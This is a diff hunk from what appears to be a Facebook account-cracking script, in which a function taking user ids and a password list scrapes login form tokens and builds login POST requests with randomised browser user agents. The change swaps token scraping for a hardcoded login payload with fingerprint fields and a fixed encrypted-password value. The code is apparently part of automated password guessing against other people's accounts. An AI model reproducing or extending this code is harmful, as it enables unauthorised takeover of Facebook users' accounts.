@@ -286,10 +286,29 @@ def rndm2(ids,passlist,mthd_svr,fb):
             #ua3 = f"Mozilla/5.0 (Linux; Android "+str(random.randint(4,14))+"; "+str(random.choice(mdlx))+") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
             referer_url = 'https://www.facebook.com/login/web/?cuid=AYjpakrqTxrj5wFmV-QKHtvBbm2N0-lN7kL6BSohrV5OSxEQiELa8jUVPNKttxFGxP_fEKh2T4jjljwjvXxMxv_CLYnEqFpruZ4J2J-leEJbo7bKf5HIH2jW5aGCKe2zHZVeNfNwvo7aTAsQuFox5426R-oiVC3bV5-Mv6FylyvXu-4TlUVzq3_kNNNbXYJB95Elmh2S5rxVZGI6E8ORDJzoYWa9H2aU5wo4u9V5NE68uP6w4LXSEFcMbPZ91JWBUUznW4V3s0vc7lLiWt12J-cpexhphXL9pzjsXIURSjPNng&email=8389066877&is_from_lara=1'
             cuidv = session.get(referer_url).text
-            cuid = {"cuid":re.search('name="cuid" value="(.*?)"', str(cuidv)).group(1),}
-            print(f"\r\r {b}[cuid-OK]{cuid}")
-            git_fb = session.get(f"https://{fb}.facebook.com").text
-            logn_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(git_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(git_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(git_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(git_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pww,"login":"Log In"}
+            logn_data = {
+            'jazoest':re.search('name="jazoest" value="(.*?)"', str(cuidv)).group(1),
+            'lsd':re.search('name="lsd" value="(.*?)"', str(cuidv)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '1',
+            'timezone': '-330',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
+            'lgnrnd': '054835_NX-n',
+            'lgnjs': '1724503715',
+            'cuid':re.search('name="cuid" value="(.*?)"', str(cuidv)).group(1),
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAK/KKAAAAAAAEAA',
+            'encpass': '#PWD_BROWSER:5:1724503742:AdxQAK5yMsTmwhiAOuOBLv+LJZ420rIlAUhdhcxNhZn+0nZfvZK1fCITx6TqgItExzPzPWdCI/aqsAvJqPHzZpFIl7KMajDqqdFh5W+itQQqUnaHlF/Y+F38/Y2waFtrAe0HTn/ZGhuLd5yF',}
             user_info = {'Host': f'{fb}.facebook.com',
             'Connection': 'keep-alive',
             'Content-Length': '{len(str(logn_data))}',
